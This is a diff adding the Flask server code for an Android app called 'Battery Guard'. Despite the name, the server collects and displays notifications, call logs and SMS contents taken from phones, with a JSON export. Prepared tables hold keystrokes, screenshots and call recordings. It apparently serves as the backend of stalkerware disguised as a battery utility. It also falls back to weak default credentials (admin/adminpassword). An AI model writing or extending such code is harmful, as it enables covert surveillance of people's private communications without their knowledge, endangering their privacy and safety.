@@ -1,0 +1,484 @@
+"""
+Battery Guard — Backend Server
+
+Flask application that:
+1. Receives synced data from the Android app via POST /api/v1/sync
+2. Stores data in PostgreSQL / SQLite
+3. Provides a web dashboard to browse captured data
+
+Authentication:
+- API endpoints: X-API-Key header
+- Dashboard: username/password login with session cookies
+"""
+
+import os
+from datetime import datetime, timezone
+from functools import wraps
+
+from dotenv import load_dotenv
+from flask import Flask, request, jsonify, render_template, redirect, url_for, session
+from flask_sqlalchemy import SQLAlchemy
+
+load_dotenv()
+
+app = Flask(__name__)
+db_url = os.getenv('DATABASE_URL', 'sqlite:///phone_monitor.db')
+# Handle postgres:// vs postgresql:// compatibility if needed
+if db_url.startswith("postgres://"):
+    db_url = db_url.replace("postgres://", "postgresql://", 1)
+
+app.config['SQLALCHEMY_DATABASE_URI'] = db_url
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default-dev-secret-key-battery-guard')
+
+db = SQLAlchemy(app)
+
+API_KEY = os.getenv('API_KEY', 'your-secret-api-key-change-this')
+DASHBOARD_USERNAME = os.getenv('DASHBOARD_USERNAME', 'admin')
+DASHBOARD_PASSWORD = os.getenv('DASHBOARD_PASSWORD', 'adminpassword')
+
+def get_api_key():
+    return os.getenv('API_KEY', API_KEY)
+
+def get_dashboard_creds():
+    return os.getenv('DASHBOARD_USERNAME', DASHBOARD_USERNAME), os.getenv('DASHBOARD_PASSWORD', DASHBOARD_PASSWORD)
+
+
+# ─── Models ──────────────────────────────────────────────────────────
+
+def pk_column():
+    return db.Column(db.BigInteger().with_variant(db.Integer, "sqlite"), primary_key=True, autoincrement=True)
+
+
+class Device(db.Model):
+    __tablename__ = 'devices'
+    device_id = db.Column(db.String(64), primary_key=True)
+    device_model = db.Column(db.String(128))
+    android_version = db.Column(db.String(16))
+    app_version = db.Column(db.String(16))
+    first_seen = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+    last_sync = db.Column(db.DateTime)
+
+
+class Notification(db.Model):
+    __tablename__ = 'notifications'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    app_package = db.Column(db.String(256), nullable=False, index=True)
+    app_name = db.Column(db.String(128))
+    title = db.Column(db.Text)
+    content = db.Column(db.Text)
+    category = db.Column(db.String(64))
+    received_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+class CallLog(db.Model):
+    __tablename__ = 'call_logs'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    phone_number = db.Column(db.String(32), nullable=False, index=True)
+    contact_name = db.Column(db.String(128))
+    call_type = db.Column(db.String(16), nullable=False)
+    duration_sec = db.Column(db.Integer, default=0)
+    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+class SmsMessage(db.Model):
+    __tablename__ = 'sms_messages'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    address = db.Column(db.String(32), nullable=False, index=True)
+    contact_name = db.Column(db.String(128))
+    body = db.Column(db.Text)
+    sms_type = db.Column(db.String(16), nullable=False)
+    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+# ─── Phase 2 models (created now, ready for future expansion) ────────
+
+class Keystroke(db.Model):
+    __tablename__ = 'keystrokes'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    app_package = db.Column(db.String(256), nullable=False, index=True)
+    app_name = db.Column(db.String(128))
+    text = db.Column(db.Text, nullable=False)
+    captured_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+class Screenshot(db.Model):
+    __tablename__ = 'screenshots'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    file_path = db.Column(db.String(512), nullable=False)
+    file_size = db.Column(db.Integer)
+    captured_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+class CallRecording(db.Model):
+    __tablename__ = 'call_recordings'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    phone_number = db.Column(db.String(32))
+    contact_name = db.Column(db.String(128))
+    call_type = db.Column(db.String(16))
+    duration_sec = db.Column(db.Integer)
+    file_path = db.Column(db.String(512), nullable=False)
+    file_size = db.Column(db.Integer)
+    format = db.Column(db.String(16))
+    recorded_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+# ─── Auth Helpers ────────────────────────────────────────────────────
+
+def require_api_key(f):
+    """Decorator to require API key for API endpoints."""
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        key = request.headers.get('X-API-Key')
+        if not key or key != get_api_key():
+            return jsonify({'error': 'unauthorized'}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+
+def require_login(f):
+    """Decorator to require dashboard login."""
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get('logged_in'):
+            return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    return decorated
+
+
+# ─── API Endpoints ───────────────────────────────────────────────────
+
+
+@app.route('/api/v1/sync', methods=['POST'])
+@require_api_key
+def sync_data():
+    """
+    Receives all data types in a single batch from the Android app.
+    
+    Expected JSON payload:
+    {
+      "device_id": "...",
+      "device_model": "...",
+      "android_version": "...",
+      "app_version": "...",
+      "notifications": [...],
+      "call_logs": [...],
+      "sms_messages": [...]
+    }
+    """
+    data = request.get_json(silent=True)
+    if not data:
+        return jsonify({'error': 'invalid or missing JSON payload'}), 400
+
+    device_id = data.get('device_id')
+    if not device_id:
+        return jsonify({'error': 'device_id is required'}), 400
+
+    now = datetime.now(timezone.utc)
+
+    # Upsert device info
+    device = db.session.get(Device, device_id)
+    if not device:
+        device = Device(
+            device_id=device_id,
+            device_model=data.get('device_model', 'Unknown Device'),
+            android_version=data.get('android_version', 'Unknown'),
+            app_version=data.get('app_version', '1.0.0'),
+            first_seen=now
+        )
+        db.session.add(device)
+    else:
+        if 'device_model' in data:
+            device.device_model = data['device_model']
+        if 'android_version' in data:
+            device.android_version = data['android_version']
+        if 'app_version' in data:
+            device.app_version = data['app_version']
+    device.last_sync = now
+
+    received_notification_ids = []
+    received_call_log_ids = []
+    received_sms_ids = []
+
+    # Process notifications
+    for n in data.get('notifications', []):
+        try:
+            local_id = n.get('local_id')
+            raw_ts = n.get('received_at', 0)
+            received_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
+            notif = Notification(
+                device_id=device_id,
+                app_package=n.get('app_package', 'unknown'),
+                app_name=n.get('app_name'),
+                title=n.get('title'),
+                content=n.get('content'),
+                category=n.get('category'),
+                received_at=received_at,
+                synced_at=now
+            )
+            db.session.add(notif)
+            if local_id is not None:
+                received_notification_ids.append(local_id)
+        except Exception as e:
+            app.logger.error(f"Error parsing notification item: {e}")
+
+    # Process call logs
+    for c in data.get('call_logs', []):
+        try:
+            local_id = c.get('local_id')
+            raw_ts = c.get('occurred_at', 0)
+            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
+            call = CallLog(
+                device_id=device_id,
+                phone_number=c.get('phone_number', 'unknown'),
+                contact_name=c.get('contact_name'),
+                call_type=c.get('call_type', 'unknown'),
+                duration_sec=int(c.get('duration_sec', 0)),
+                occurred_at=occurred_at,
+                synced_at=now
+            )
+            db.session.add(call)
+            if local_id is not None:
+                received_call_log_ids.append(local_id)
+        except Exception as e:
+            app.logger.error(f"Error parsing call log item: {e}")
+
+    # Process SMS messages
+    for s in data.get('sms_messages', []):
+        try:
+            local_id = s.get('local_id')
+            raw_ts = s.get('occurred_at', 0)
+            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
+            sms = SmsMessage(
+                device_id=device_id,
+                address=s.get('address', 'unknown'),
+                contact_name=s.get('contact_name'),
+                body=s.get('body'),
+                sms_type=s.get('sms_type', 'unknown'),
+                occurred_at=occurred_at,
+                synced_at=now
+            )
+            db.session.add(sms)
+            if local_id is not None:
+                received_sms_ids.append(local_id)
+        except Exception as e:
+            app.logger.error(f"Error parsing SMS item: {e}")
+
+    db.session.commit()
+
+    return jsonify({
+        'status': 'ok',
+        'received': {
+            'notifications': received_notification_ids,
+            'call_logs': received_call_log_ids,
+            'sms_messages': received_sms_ids
+        }
+    })
+
+
+# ─── Dashboard Routes ────────────────────────────────────────────────
+
+@app.route('/')
+def root():
+    if session.get('logged_in'):
+        return redirect(url_for('dashboard'))
+    return redirect(url_for('login'))
+
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username', '')
+        password = request.form.get('password', '')
+        valid_user, valid_pass = get_dashboard_creds()
+        if username == valid_user and password == valid_pass:
+            session['logged_in'] = True
+            return redirect(url_for('dashboard'))
+        return render_template('login.html', error='Invalid username or password')
+    return render_template('login.html')
+
+
+
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('login'))
+
+
+@app.route('/dashboard')
+@require_login
+def dashboard():
+    """Overview page with counts and last sync time."""
+    devices = Device.query.order_by(Device.last_sync.desc().nullslast()).all()
+    total_notifications = Notification.query.count()
+    total_calls = CallLog.query.count()
+    total_sms = SmsMessage.query.count()
+
+    recent_notifications = Notification.query.order_by(Notification.received_at.desc()).limit(5).all()
+    recent_calls = CallLog.query.order_by(CallLog.occurred_at.desc()).limit(5).all()
+    recent_sms = SmsMessage.query.order_by(SmsMessage.occurred_at.desc()).limit(5).all()
+
+    return render_template('dashboard.html',
+                           devices=devices,
+                           total_notifications=total_notifications,
+                           total_calls=total_calls,
+                           total_sms=total_sms,
+                           recent_notifications=recent_notifications,
+                           recent_calls=recent_calls,
+                           recent_sms=recent_sms)
+
+
+@app.route('/dashboard/notifications')
+@require_login
+def dashboard_notifications():
+    """Paginated notification list, newest first."""
+    page = request.args.get('page', 1, type=int)
+    app_filter = request.args.get('app', None)
+    device_filter = request.args.get('device', None)
+
+    query = Notification.query
+    if app_filter:
+        query = query.filter(Notification.app_package == app_filter)
+    if device_filter:
+        query = query.filter(Notification.device_id == device_filter)
+
+    pagination = query.order_by(Notification.received_at.desc()).paginate(page=page, per_page=50, error_out=False)
+
+    apps = db.session.query(
+        Notification.app_package, Notification.app_name
+    ).distinct().order_by(Notification.app_name.asc().nullslast()).all()
+
+    devices = Device.query.all()
+
+    return render_template('notifications.html',
+                           notifications=pagination.items,
+                           pagination=pagination,
+                           apps=apps,
+                           devices=devices,
+                           current_app=app_filter,
+                           current_device=device_filter)
+
+
+@app.route('/dashboard/calls')
+@require_login
+def dashboard_calls():
+    """Paginated call log list, newest first."""
+    page = request.args.get('page', 1, type=int)
+    device_filter = request.args.get('device', None)
+    type_filter = request.args.get('type', None)
+
+    query = CallLog.query
+    if device_filter:
+        query = query.filter(CallLog.device_id == device_filter)
+    if type_filter:
+        query = query.filter(CallLog.call_type == type_filter)
+
+    pagination = query.order_by(CallLog.occurred_at.desc()).paginate(page=page, per_page=50, error_out=False)
+    devices = Device.query.all()
+
+    return render_template('calls.html',
+                           calls=pagination.items,
+                           pagination=pagination,
+                           devices=devices,
+                           current_device=device_filter,
+                           current_type=type_filter)
+
+
+@app.route('/dashboard/sms')
+@require_login
+def dashboard_sms():
+    """Paginated SMS list, newest first."""
+    page = request.args.get('page', 1, type=int)
+    device_filter = request.args.get('device', None)
+    contact_filter = request.args.get('contact', None)
+
+    query = SmsMessage.query
+    if device_filter:
+        query = query.filter(SmsMessage.device_id == device_filter)
+    if contact_filter:
+        query = query.filter(SmsMessage.address == contact_filter)
+
+    pagination = query.order_by(SmsMessage.occurred_at.desc()).paginate(page=page, per_page=50, error_out=False)
+
+    contacts = db.session.query(
+        SmsMessage.address, SmsMessage.contact_name
+    ).distinct().order_by(SmsMessage.address).all()
+
+    devices = Device.query.all()
+
+    return render_template('sms.html',
+                           messages=pagination.items,
+                           pagination=pagination,
+                           contacts=contacts,
+                           devices=devices,
+                           current_contact=contact_filter,
+                           current_device=device_filter)
+
+
+@app.route('/api/v1/export')
+@require_api_key
+def export_data():
+    """Export all data as JSON."""
+    notifications = [{
+        'id': n.id,
+        'device_id': n.device_id,
+        'app_package': n.app_package,
+        'app_name': n.app_name,
+        'title': n.title,
+        'content': n.content,
+        'category': n.category,
+        'received_at': n.received_at.isoformat() if n.received_at else None,
+        'synced_at': n.synced_at.isoformat() if n.synced_at else None
+    } for n in Notification.query.order_by(Notification.received_at.desc()).all()]
+
+    calls = [{
+        'id': c.id,
+        'device_id': c.device_id,
+        'phone_number': c.phone_number,
+        'contact_name': c.contact_name,
+        'call_type': c.call_type,
+        'duration_sec': c.duration_sec,
+        'occurred_at': c.occurred_at.isoformat() if c.occurred_at else None,
+        'synced_at': c.synced_at.isoformat() if c.synced_at else None
+    } for c in CallLog.query.order_by(CallLog.occurred_at.desc()).all()]
+
+    sms = [{
+        'id': s.id,
+        'device_id': s.device_id,
+        'address': s.address,
+        'contact_name': s.contact_name,
+        'body': s.body,
+        'sms_type': s.sms_type,
+        'occurred_at': s.occurred_at.isoformat() if s.occurred_at else None,
+        'synced_at': s.synced_at.isoformat() if s.synced_at else None
+    } for s in SmsMessage.query.order_by(SmsMessage.occurred_at.desc()).all()]
+
+    return jsonify({
+        'status': 'ok',
+        'exported_at': datetime.now(timezone.utc).isoformat(),
+        'notifications': notifications,
+        'call_logs': calls,
+        'sms_messages': sms
+    })
+
+
+# ─── Database Initialization ─────────────────────────────────────────
+
+with app.app_context():
+    db.create_all()
+
+if __name__ == '__main__':
+    port = int(os.getenv('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
